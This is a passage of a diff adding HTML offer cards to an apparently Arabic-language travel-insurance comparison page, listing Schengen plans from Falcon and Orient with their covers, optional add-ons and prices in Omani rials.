+                                <div class="Title">السعر الأساسي</div>
+                                <div class="Amount">
+                                    <span class="cur-name">ر.ع</span>
+                                    <span class="amt">18.3</span>
+                                    <span class="amt-tax">+ الضرائب</span>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                    <div class="col-sm-12 col-md-6">
+                        <div>
+                            <div class="row optional pl-10-pr-10">
+                                <div class="col-sm-12 title ">
+                                    <span class="bold liner">إختياري  </span>
+                                </div>
+                                <div class="col-sm-12 covers">
+                                    <div>
+                                        <ul>
+                                        </ul>
+                                    </div>
+                                </div>
+
+                                <div class="pt-2 pt-md-4 payment">
+                                    <div class="row ">
+                                        <div class="col">
+                                            <div class="buy ">
+                                                <div class="d-flex justify-content-between">
+                                                    <div class="">
+                                                        <div class="Title ">إجمالي المبلغ ( <span class="small font-weight-bold"> إلى 2 المسافرين </span> )</div>
+                                                        <div class="Amount">
+                                                            <span class="cur-name">ر.ع</span> <span>19.6</span>
+                                                        </div>
+                                                    </div>
+                                                    <div class="d-flex flex-column">
+                                                        <div>
+                                                            <span style="font-size:12px">السفر إلى:</span>
+                                                        </div>
+                                                        <div>
+                                                            <span style="font-size:12px">شنجن</span>
+                                                        </div>
+                                                        <a href="travel-beneficiaries.html?amount=19.6" target="_self" class="btn btn-buy-now bold">
+                                                            أختر
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    </div>
+    <!-- العربية فالكون للتأمين - Travel Assurance- Silver Plan -->
+    <div class="col-sm-12 col-lg-12 div_offer_outer" id="ofr_FALCON_6">
+
+<div class="card-ofr-outer2">
+    <div class="card-ofr">
+        <div class="card-ofr-inner">
+            <div class="card-ofr-loader"><div class="">جارٍ العمل <i class="fas fa-spinner fa-spin"></i> </div></div>
+            <div class="row card-ofr-header">
+                <div class="col float-start card-ofr-header-company d-flex align-items-start">
+                    <div class="logo" style="flex: 0 0 0; ">
+                        <img src="../assets/images/insurers/falcon-logo-thumb.jpg" alt="Provider">
+                    </div>
+                    <div class="name" style="flex: 1;">
+                        <div class="title">
+                            العربية فالكون للتأمين
+                        </div>
+                        <div class="sub-title">Travel Assurance- Silver Plan</div>
+                        <div class="sub-title instant-insurance" style="line-height: 15px; margin-bottom: 5px;">تأمين فوري ⚡</div>
+                        <div class="sub-title qrcode-available">يتوفر التحقق عبر&nbsp;QR-Code <img class="policy-qr-code" style="max-width: 15px;" alt="Policy QR Code" src="../img/PolicyQR/qrcode.png"></div>
+                        <div class="sub-title region_name" style="line-height: 15px; margin-bottom: 5px;">شنجن</div>
+                    </div>
+                </div>
+                <div class="float-end viewMore" style="width: fit-content; margin: inherit;">
+                    <div class="d-flex justify-content-end">
+                        <a class="nav-link d-inline res-fs-1 viewOfferDetails" href="#">
+                            <i class="fa-light fa-square-ellipsis"></i> تفاصيل
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card-ofr-body">
+                <div class="row display-flex">
+                    <div class="col-sm-12 col-md-6 ">
+                        <div class="bg-color-covers-included ">
+                            <div class="row included pl-10-pr-10">
+                                <div class="col-sm-12 title">
+                                    <span class="bold">يشمل التغطيات</span>
+                                </div>
+                                <div class="col-sm-12">
+                                    <span class="bold">Adult Covers</span>
+                                </div>
+                                <div class="col-sm-12 covers ">
+                                    <div class="opt-outer"><div class="opt">Emergency Medical Evacuation $50,000</div></div>
+                                    <div class="opt-outer"><div class="opt">Accidental Death and Permanent Disablement $20,000</div></div>
+                                    <div class="opt-outer"><div class="opt">Accidental and Sickness Medical Reimbursement $50,000</div></div>
+                                </div>
+                                <div class="col-sm-12">
+                                    <span class="bold">Child Covers</span>
+                                </div>
+                                <div class="col-sm-12 covers ">
+                                    <div class="opt-outer"><div class="opt">Accidental Death and Permanent Disablement $20,000</div></div>
+                                    <div class="opt-outer"><div class="opt">Accidental and Sickness Medical Reimbursement $50,000</div></div>
+                                    <div class="opt-outer"><div class="opt">Emergency Medical Evacuation $50,000</div></div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="pl-10-pr-10 BasePrice-outer ">
+                            <div class=" BasePrice ">
+                                <div class="Title">السعر الأساسي</div>
+                                <div class="Amount">
+                                    <span class="cur-name">ر.ع</span>
+                                    <span class="amt">18.3</span>
+                                    <span class="amt-tax">+ الضرائب</span>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                    <div class="col-sm-12 col-md-6">
+                        <div>
+                            <div class="row optional pl-10-pr-10">
+                                <div class="col-sm-12 title ">
+                                    <span class="bold liner">إختياري  </span>
+                                </div>
+                                <div class="col-sm-12 covers">
+                                    <div>
+                                        <ul>
+                                        </ul>
+                                    </div>
+                                </div>
+
+                                <div class="pt-2 pt-md-4 payment">
+                                    <div class="row ">
+                                        <div class="col">
+                                            <div class="buy ">
+                                                <div class="d-flex justify-content-between">
+                                                    <div class="">
+                                                        <div class="Title ">إجمالي المبلغ ( <span class="small font-weight-bold"> إلى 2 المسافرين </span> )</div>
+                                                        <div class="Amount">
+                                                            <span class="cur-name">ر.ع</span> <span>19.6</span>
+                                                        </div>
+                                                    </div>
+                                                    <div class="d-flex flex-column">
+                                                        <div>
+                                                            <span style="font-size:12px">السفر إلى:</span>
+                                                        </div>
+                                                        <div>
+                                                            <span style="font-size:12px">شنجن</span>
+                                                        </div>
+                                                        <a href="travel-beneficiaries.html?amount=19.6" target="_self" class="btn btn-buy-now bold">
+                                                            أختر
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    </div>
+    <!-- العربية فالكون للتأمين - Travel Assurance- Gold Plan -->
+    <div class="col-sm-12 col-lg-12 div_offer_outer" id="ofr_FALCON_7">
+
+<div class="card-ofr-outer2">
+    <div class="card-ofr">
+        <div class="card-ofr-inner">
+            <div class="card-ofr-loader"><div class="">جارٍ العمل <i class="fas fa-spinner fa-spin"></i> </div></div>
+            <div class="row card-ofr-header">
+                <div class="col float-start card-ofr-header-company d-flex align-items-start">
+                    <div class="logo" style="flex: 0 0 0; ">
+                        <img src="../assets/images/insurers/falcon-logo-thumb.jpg" alt="Provider">
+                    </div>
+                    <div class="name" style="flex: 1;">
+                        <div class="title">
+                            العربية فالكون للتأمين
+                        </div>
+                        <div class="sub-title">Travel Assurance- Gold Plan</div>
+                        <div class="sub-title instant-insurance" style="line-height: 15px; margin-bottom: 5px;">تأمين فوري ⚡</div>
+                        <div class="sub-title qrcode-available">يتوفر التحقق عبر&nbsp;QR-Code <img class="policy-qr-code" style="max-width: 15px;" alt="Policy QR Code" src="../img/PolicyQR/qrcode.png"></div>
+                        <div class="sub-title region_name" style="line-height: 15px; margin-bottom: 5px;">شنجن</div>
+                    </div>
+                </div>
+                <div class="float-end viewMore" style="width: fit-content; margin: inherit;">
+                    <div class="d-flex justify-content-end">
+                        <a class="nav-link d-inline res-fs-1 viewOfferDetails" href="#">
+                            <i class="fa-light fa-square-ellipsis"></i> تفاصيل
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card-ofr-body">
+                <div class="row display-flex">
+                    <div class="col-sm-12 col-md-6 ">
+                        <div class="bg-color-covers-included ">
+                            <div class="row included pl-10-pr-10">
+                                <div class="col-sm-12 title">
+                                    <span class="bold">يشمل التغطيات</span>
+                                </div>
+                                <div class="col-sm-12">
+                                    <span class="bold">Adult Covers</span>
+                                </div>
+                                <div class="col-sm-12 covers ">
+                                    <div class="opt-outer"><div class="opt">Accidental and Sickness Medical Reimbursement $100,000</div></div>
+                                    <div class="opt-outer"><div class="opt">Emergency Medical Evacuation $100,000</div></div>
+                                    <div class="opt-outer"><div class="opt">Accidental Death and Permanent Disablement $30,000</div></div>
+                                </div>
+                                <div class="col-sm-12">
+                                    <span class="bold">Child Covers</span>
+                                </div>
+                                <div class="col-sm-12 covers ">
+                                    <div class="opt-outer"><div class="opt">Accidental and Sickness Medical Reimbursement $100,000</div></div>
+                                    <div class="opt-outer"><div class="opt">Emergency Medical Evacuation $100,000</div></div>
+                                    <div class="opt-outer"><div class="opt">Accidental Death and Permanent Disablement $30,000</div></div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="pl-10-pr-10 BasePrice-outer ">
+                            <div class=" BasePrice ">
+                                <div class="Title">السعر الأساسي</div>
+                                <div class="Amount">
+                                    <span class="cur-name">ر.ع</span>
+                                    <span class="amt">31.9</span>
+                                    <span class="amt-tax">+ الضرائب</span>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                    <div class="col-sm-12 col-md-6">
+                        <div>
+                            <div class="row optional pl-10-pr-10">
+                                <div class="col-sm-12 title ">
+                                    <span class="bold liner">إختياري  </span>
+                                </div>
+                                <div class="col-sm-12 covers">
+                                    <div>
+                                        <ul>
+                                        </ul>
+                                    </div>
+                                </div>
+
+                                <div class="pt-2 pt-md-4 payment">
+                                    <div class="row ">
+                                        <div class="col">
+                                            <div class="buy ">
+                                                <div class="d-flex justify-content-between">
+                                                    <div class="">
+                                                        <div class="Title ">إجمالي المبلغ ( <span class="small font-weight-bold"> إلى 2 المسافرين </span> )</div>
+                                                        <div class="Amount">
+                                                            <span class="cur-name">ر.ع</span> <span>34.2</span>
+                                                        </div>
+                                                    </div>
+                                                    <div class="d-flex flex-column">
+                                                        <div>
+                                                            <span style="font-size:12px">السفر إلى:</span>
+                                                        </div>
+                                                        <div>
+                                                            <span style="font-size:12px">شنجن</span>
+                                                        </div>
+                                                        <a href="travel-beneficiaries.html?amount=34.2" target="_self" class="btn btn-buy-now bold">
+                                                            أختر
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    </div>
+    <!-- أورينت للتأمين - Travel Lite Plus -->
+    <div class="col-sm-12 col-lg-12 div_offer_outer" id="ofr_ORIENT_8">
+
+<div class="card-ofr-outer2">
+    <div class="card-ofr">
+        <div class="card-ofr-inner">
+            <div class="card-ofr-loader"><div class="">جارٍ العمل <i class="fas fa-spinner fa-spin"></i> </div></div>
+            <div class="row card-ofr-header">
+                <div class="col float-start card-ofr-header-company d-flex align-items-start">
+                    <div class="logo" style="flex: 0 0 0; ">
+                        <img src="../assets/images/insurers/orient-logo-thumb.jpg" alt="Provider">
+                    </div>
+                    <div class="name" style="flex: 1;">
+                        <div class="title">
+                            أورينت للتأمين
+                        </div>
+                        <div class="sub-title">Travel Lite Plus</div>
+                        <div class="sub-title instant-insurance" style="line-height: 15px; margin-bottom: 5px;">تأمين فوري ⚡</div>
+                        <div class="sub-title qrcode-available">يتوفر التحقق عبر&nbsp;QR-Code <img class="policy-qr-code" style="max-width: 15px;" alt="Policy QR Code" src="../img/PolicyQR/qrcode.png"></div>
+                        <div class="sub-title region_name" style="line-height: 15px; margin-bottom: 5px;">شنجن</div>
+                    </div>
+                </div>
+                <div class="float-end viewMore" style="width: fit-content; margin: inherit;">
+                    <div class="d-flex justify-content-end">
+                        <a class="nav-link d-inline res-fs-1 viewOfferDetails" href="#">
+                            <i class="fa-light fa-square-ellipsis"></i> تفاصيل
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card-ofr-body">
+                <div class="row display-flex">
+                    <div class="col-sm-12 col-md-6 ">
+                        <div class="bg-color-covers-included ">
+                            <div class="row included pl-10-pr-10">
+                                <div class="col-sm-12 title">
+                                    <span class="bold">يشمل التغطيات</span>
+                                </div>
+                                <div class="col-sm-12 covers ">
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> Single Trip</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> خدمات الطوارئ الطبية والمصاريف المرتبطة بها $50,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> الإخلاء الطبي في حالت الطوارئ</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> علاج الأسنان (مشمول في النفقات الطبية الطارئة) 500 دولار (100 دولار لكل سن)</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> إعادة الجثمان $5,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> تكاليف الجنازة $500</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> رسائل الترحيل الطارئ ( 2 رسائل كل 24 ساعة )</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> مراقبة الرعاية الحرجة</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> المزايا النقدية في المستشفى 250 دولارًا (25 دولارًا في اليوم)</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> فقدان الأمتعة الشخصية $100</div></div>
+                                </div>
+                                <a href="#" onclick="return false;" class="mt-2 mb-3 font-size-11px">عرض المزيد</a>
+                            </div>
+                        </div>
+
+                        <div class="pl-10-pr-10 BasePrice-outer ">
+                            <div class=" BasePrice ">
+                                <div class="Title">السعر الأساسي</div>
+                                <div class="Amount">
+                                    <span class="cur-name">ر.ع</span>
+                                    <span class="amt">15.7</span>
+                                    <span class="amt-tax">+ الضرائب</span>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                    <div class="col-sm-12 col-md-6">
+                        <div>
+                            <div class="row optional pl-10-pr-10">
+                                <div class="col-sm-12 title ">
+                                    <span class="bold liner">إختياري  </span>
+                                </div>
+                                <div class="col-sm-12 covers">
+                                    <div>
+                                        <ul>
+                                            <li>
+                                                <div class="cover_outer">
+                                                    <div class="row">
+                                                        <div class="col-12">
+                                                            <div class="ofr-cover">
+                                                                <div class="ofr-cover-chk">
+                                                                    <input type="checkbox" id="ofr_ORIENT_8_Winter_sports_extens">
+                                                                </div>
+                                                                <div class="ofr-cover-lbl">
+                                                                    <label class="m-0" for="ofr_ORIENT_8_Winter_sports_extens">Winter sports extension</label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+
+                                <div class="pt-2 pt-md-4 payment">
+                                    <div class="row ">
+                                        <div class="col">
+                                            <div class="buy ">
+                                                <div class="d-flex justify-content-between">
+                                                    <div class="">
+                                                        <div class="Title ">إجمالي المبلغ ( <span class="small font-weight-bold"> إلى 2 المسافرين </span> )</div>
+                                                        <div class="Amount">
+                                                            <span class="cur-name">ر.ع</span> <span>16.9</span>
+                                                        </div>
+                                                    </div>
+                                                    <div class="d-flex flex-column">
+                                                        <div>
+                                                            <span style="font-size:12px">السفر إلى:</span>
+                                                        </div>
+                                                        <div>
+                                                            <span style="font-size:12px">شنجن</span>
+                                                        </div>
+                                                        <a href="travel-beneficiaries.html?amount=16.9" target="_self" class="btn btn-buy-now bold">
+                                                            أختر
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    </div>
+    <!-- أورينت للتأمين - Travel Safe Plus -->
+    <div class="col-sm-12 col-lg-12 div_offer_outer" id="ofr_ORIENT_9">
+
+<div class="card-ofr-outer2">
+    <div class="card-ofr">
+        <div class="card-ofr-inner">
+            <div class="card-ofr-loader"><div class="">جارٍ العمل <i class="fas fa-spinner fa-spin"></i> </div></div>
+            <div class="row card-ofr-header">
+                <div class="col float-start card-ofr-header-company d-flex align-items-start">
+                    <div class="logo" style="flex: 0 0 0; ">
+                        <img src="../assets/images/insurers/orient-logo-thumb.jpg" alt="Provider">
+                    </div>
+                    <div class="name" style="flex: 1;">
+                        <div class="title">
+                            أورينت للتأمين
+                        </div>
+                        <div class="sub-title">Travel Safe Plus</div>
+                        <div class="sub-title instant-insurance" style="line-height: 15px; margin-bottom: 5px;">تأمين فوري ⚡</div>
+                        <div class="sub-title qrcode-available">يتوفر التحقق عبر&nbsp;QR-Code <img class="policy-qr-code" style="max-width: 15px;" alt="Policy QR Code" src="../img/PolicyQR/qrcode.png"></div>
+                        <div class="sub-title region_name" style="line-height: 15px; margin-bottom: 5px;">شنجن</div>
+                    </div>
+                </div>
+                <div class="float-end viewMore" style="width: fit-content; margin: inherit;">
+                    <div class="d-flex justify-content-end">
+                        <a class="nav-link d-inline res-fs-1 viewOfferDetails" href="#">
+                            <i class="fa-light fa-square-ellipsis"></i> تفاصيل
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card-ofr-body">
+                <div class="row display-flex">
+                    <div class="col-sm-12 col-md-6 ">
+                        <div class="bg-color-covers-included ">
+                            <div class="row included pl-10-pr-10">
+                                <div class="col-sm-12 title">
+                                    <span class="bold">يشمل التغطيات</span>
+                                </div>
+                                <div class="col-sm-12 covers ">
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> Single Trip</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> خدمات الطوارئ الطبية والمصاريف المرتبطة بها $100,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> الإخلاء الطبي في حالت الطوارئ</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> علاج الأسنان (مشمول في النفقات الطبية الطارئة) 500 دولار (100 دولار لكل سن)</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> $7,000 إعادة الجثمان</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> $750 تكاليف الجنازة</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> السفر الطارئ للعائلة (تذكرة ذهاب وعودة اقتصادية واحدة)</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> رسائل الترحيل الطارئ (3 رسائل كل 24 ساعة)</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> مراقبة الرعاية الحرجة</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> المزايا النقدية في المستشفى 350 دولارًا (35 دولارًا في اليوم)</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> فقدان الأمتعة الشخصية $1,000</div></div>
+                                </div>
+                                <a href="#" onclick="return false;" class="mt-2 mb-3 font-size-11px">عرض المزيد</a>
+                            </div>
+                        </div>
+
+                        <div class="pl-10-pr-10 BasePrice-outer ">
+                            <div class=" BasePrice ">
+                                <div class="Title">السعر الأساسي</div>
+                                <div class="Amount">
+                                    <span class="cur-name">ر.ع</span>
+                                    <span class="amt">20.2</span>
+                                    <span class="amt-tax">+ الضرائب</span>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                    <div class="col-sm-12 col-md-6">
+                        <div>
+                            <div class="row optional pl-10-pr-10">
+                                <div class="col-sm-12 title ">
+                                    <span class="bold liner">إختياري  </span>
+                                </div>
+                                <div class="col-sm-12 covers">
+                                    <div>
+                                        <ul>
+                                            <li>
+                                                <div class="cover_outer">
+                                                    <div class="row">
+                                                        <div class="col-12">
+                                                            <div class="ofr-cover">
+                                                                <div class="ofr-cover-chk">
+                                                                    <input type="checkbox" id="ofr_ORIENT_9_مخاطر_الإرهاب">
+                                                                </div>
+                                                                <div class="ofr-cover-lbl">
+                                                                    <label class="m-0" for="ofr_ORIENT_9_مخاطر_الإرهاب">مخاطر الإرهاب</label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                            <li>
+                                                <div class="cover_outer">
+                                                    <div class="row">
+                                                        <div class="col-12">
+                                                            <div class="ofr-cover">
+                                                                <div class="ofr-cover-chk">
+                                                                    <input type="checkbox" id="ofr_ORIENT_9_Winter_sports_extens">
+                                                                </div>
+                                                                <div class="ofr-cover-lbl">
+                                                                    <label class="m-0" for="ofr_ORIENT_9_Winter_sports_extens">Winter sports extension</label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                            <li>
+                                                <div class="cover_outer">
+                                                    <div class="row">
+                                                        <div class="col-12">
+                                                            <div class="ofr-cover">
+                                                                <div class="ofr-cover-chk">
+                                                                    <input type="checkbox" id="ofr_ORIENT_9_Golf Cover Extension">
+                                                                </div>
+                                                                <div class="ofr-cover-lbl">
+                                                                    <label class="m-0" for="ofr_ORIENT_9_Golf Cover Extension">Golf Cover Extension</label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+
+                                <div class="pt-2 pt-md-4 payment">
+                                    <div class="row ">
+                                        <div class="col">
+                                            <div class="buy ">
+                                                <div class="d-flex justify-content-between">
+                                                    <div class="">
+                                                        <div class="Title ">إجمالي المبلغ ( <span class="small font-weight-bold"> إلى 2 المسافرين </span> )</div>
+                                                        <div class="Amount">
+                                                            <span class="cur-name">ر.ع</span> <span>21.7</span>
+                                                        </div>
+                                                    </div>
+                                                    <div class="d-flex flex-column">
+                                                        <div>
+                                                            <span style="font-size:12px">السفر إلى:</span>
+                                                        </div>
+                                                        <div>
+                                                            <span style="font-size:12px">شنجن</span>
+                                                        </div>
+                                                        <a href="travel-beneficiaries.html?amount=21.7" target="_self" class="btn btn-buy-now bold">
+                                                            أختر
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    </div>
+    <!-- أورينت للتأمين - Travel Family Plus -->
+    <div class="col-sm-12 col-lg-12 div_offer_outer" id="ofr_ORIENT_10">
+
+<div class="card-ofr-outer2">
+    <div class="card-ofr">
+        <div class="card-ofr-inner">
+            <div class="card-ofr-loader"><div class="">جارٍ العمل <i class="fas fa-spinner fa-spin"></i> </div></div>
+            <div class="row card-ofr-header">
+                <div class="col float-start card-ofr-header-company d-flex align-items-start">
+                    <div class="logo" style="flex: 0 0 0; ">
+                        <img src="../assets/images/insurers/orient-logo-thumb.jpg" alt="Provider">
+                    </div>
+                    <div class="name" style="flex: 1;">
+                        <div class="title">
+                            أورينت للتأمين
+                        </div>
+                        <div class="sub-title">Travel Family Plus</div>
+                        <div class="sub-title instant-insurance" style="line-height: 15px; margin-bottom: 5px;">تأمين فوري ⚡</div>
+                        <div class="sub-title qrcode-available">يتوفر التحقق عبر&nbsp;QR-Code <img class="policy-qr-code" style="max-width: 15px;" alt="Policy QR Code" src="../img/PolicyQR/qrcode.png"></div>
+                        <div class="sub-title region_name" style="line-height: 15px; margin-bottom: 5px;">شنجن</div>
+                    </div>
+                </div>
+                <div class="float-end viewMore" style="width: fit-content; margin: inherit;">
+                    <div class="d-flex justify-content-end">
+                        <a class="nav-link d-inline res-fs-1 viewOfferDetails" href="#">
+                            <i class="fa-light fa-square-ellipsis"></i> تفاصيل
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card-ofr-body">
+                <div class="row display-flex">
+                    <div class="col-sm-12 col-md-6 ">
+                        <div class="bg-color-covers-included ">
+                            <div class="row included pl-10-pr-10">
+                                <div class="col-sm-12 title">
+                                    <span class="bold">يشمل التغطيات</span>
+                                </div>
+                                <div class="col-sm-12 covers ">
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> Single Trip</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> خدمات الطوارئ الطبية والمصاريف المرتبطة بها $150,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> علاج الأسنان (مشمول في النفقات الطبية الطارئة) 1000 دولار (200 دولار لكل سن)</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> إعادة الجثمان $7,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> السفر الطارئ للعائلة (1 × تذكرة عودة اقتصادية)</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> تكاليف الجنازة $2,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> رسائل الترحيل الطارئ (3 رسائل كل 24 ساعة)</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> مراقبة الرعاية الحرجة</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> المزايا النقدية في المستشفى 500 دولار (50 دولارًا لكل يوم عائلي)</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> فقدان الأمتعة الشخصية $3,500</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> الإخلاء الطبي في حالات الطوارئ</div></div>
+                                </div>
+                                <a href="#" onclick="return false;" class="mt-2 mb-3 font-size-11px">عرض المزيد</a>
+                            </div>
+                        </div>
+
+                        <div class="pl-10-pr-10 BasePrice-outer ">
+                            <div class=" BasePrice ">
+                                <div class="Title">السعر الأساسي</div>
+                                <div class="Amount">
+                                    <span class="cur-name">ر.ع</span>
+                                    <span class="amt">23.1</span>
+                                    <span class="amt-tax">+ الضرائب</span>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                    <div class="col-sm-12 col-md-6">
+                        <div>
+                            <div class="row optional pl-10-pr-10">
+                                <div class="col-sm-12 title ">
+                                    <span class="bold liner">إختياري  </span>
+                                </div>
+                                <div class="col-sm-12 covers">
+                                    <div>
+                                        <ul>
+                                            <li>
+                                                <div class="cover_outer">
+                                                    <div class="row">
+                                                        <div class="col-12">
+                                                            <div class="ofr-cover">
+                                                                <div class="ofr-cover-chk">
+                                                                    <input type="checkbox" id="ofr_ORIENT_10_مخاطر_الإرهاب">
+                                                                </div>
+                                                                <div class="ofr-cover-lbl">
+                                                                    <label class="m-0" for="ofr_ORIENT_10_مخاطر_الإرهاب">مخاطر الإرهاب</label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                            <li>
+                                                <div class="cover_outer">
+                                                    <div class="row">
+                                                        <div class="col-12">
+                                                            <div class="ofr-cover">
+                                                                <div class="ofr-cover-chk">
+                                                                    <input type="checkbox" id="ofr_ORIENT_10_Winter_sports_extens">
+                                                                </div>
+                                                                <div class="ofr-cover-lbl">
+                                                                    <label class="m-0" for="ofr_ORIENT_10_Winter_sports_extens">Winter sports extension</label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+
+                                <div class="pt-2 pt-md-4 payment">
+                                    <div class="row ">
+                                        <div class="col">
+                                            <div class="buy ">
+                                                <div class="d-flex justify-content-between">
+                                                    <div class="">
+                                                        <div class="Title ">إجمالي المبلغ ( <span class="small font-weight-bold"> إلى 2 المسافرين </span> )</div>
+                                                        <div class="Amount">
+                                                            <span class="cur-name">ر.ع</span> <span>24.8</span>
+                                                        </div>
+                                                    </div>
+                                                    <div class="d-flex flex-column">
+                                                        <div>
+                                                            <span style="font-size:12px">السفر إلى:</span>
+                                                        </div>
+                                                        <div>
+                                                            <span style="font-size:12px">شنجن</span>
+                                                        </div>
+                                                        <a href="travel-beneficiaries.html?amount=24.8" target="_self" class="btn btn-buy-now bold">
+                                                            أختر
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    </div>
+    <!-- أورينت للتأمين - Travel Secure Plus -->
+    <div class="col-sm-12 col-lg-12 div_offer_outer" id="ofr_ORIENT_11">
+
+<div class="card-ofr-outer2">
+    <div class="card-ofr">
+        <div class="card-ofr-inner">
+            <div class="card-ofr-loader"><div class="">جارٍ العمل <i class="fas fa-spinner fa-spin"></i> </div></div>
+            <div class="row card-ofr-header">
+                <div class="col float-start card-ofr-header-company d-flex align-items-start">
+                    <div class="logo" style="flex: 0 0 0; ">
+                        <img src="../assets/images/insurers/orient-logo-thumb.jpg" alt="Provider">
+                    </div>
+                    <div class="name" style="flex: 1;">
+                        <div class="title">
+                            أورينت للتأمين
+                        </div>
+                        <div class="sub-title">Travel Secure Plus</div>
+                        <div class="sub-title instant-insurance" style="line-height: 15px; margin-bottom: 5px;">تأمين فوري ⚡</div>
+                        <div class="sub-title qrcode-available">يتوفر التحقق عبر&nbsp;QR-Code <img class="policy-qr-code" style="max-width: 15px;" alt="Policy QR Code" src="../img/PolicyQR/qrcode.png"></div>
+                        <div class="sub-title region_name" style="line-height: 15px; margin-bottom: 5px;">شنجن</div>
+                    </div>
+                </div>
+                <div class="float-end viewMore" style="width: fit-content; margin: inherit;">
+                    <div class="d-flex justify-content-end">
+                        <a class="nav-link d-inline res-fs-1 viewOfferDetails" href="#">
+                            <i class="fa-light fa-square-ellipsis"></i> تفاصيل
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card-ofr-body">
+                <div class="row display-flex">
+                    <div class="col-sm-12 col-md-6 ">
+                        <div class="bg-color-covers-included ">
+                            <div class="row included pl-10-pr-10">
+                                <div class="col-sm-12 title">
+                                    <span class="bold">يشمل التغطيات</span>
+                                </div>
+                                <div class="col-sm-12 covers ">
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> Single Trip</div></div>
